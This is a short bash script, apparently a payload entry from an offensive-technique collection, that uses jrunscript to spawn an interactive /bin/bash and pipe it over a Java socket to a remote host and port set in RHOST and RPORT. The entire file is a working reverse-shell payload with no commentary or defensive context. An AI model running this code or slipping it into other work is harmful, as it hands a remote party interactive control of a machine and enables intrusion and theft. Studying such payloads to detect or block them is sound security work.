#!/bin/bash

export RHOST=0.0.0.0
export RPORT=12345
jrunscript -e 'var host='"'""$RHOST""'"'; var port='"$RPORT"';
var p=new java.lang.ProcessBuilder("/bin/bash", "-i").redirectErrorStream(true).start();
var s=new java.net.Socket(host,port);
var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){
while(pi.available()>0)so.write(pi.read());
while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());
so.flush();po.flush();
java.lang.Thread.sleep(50);
try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'
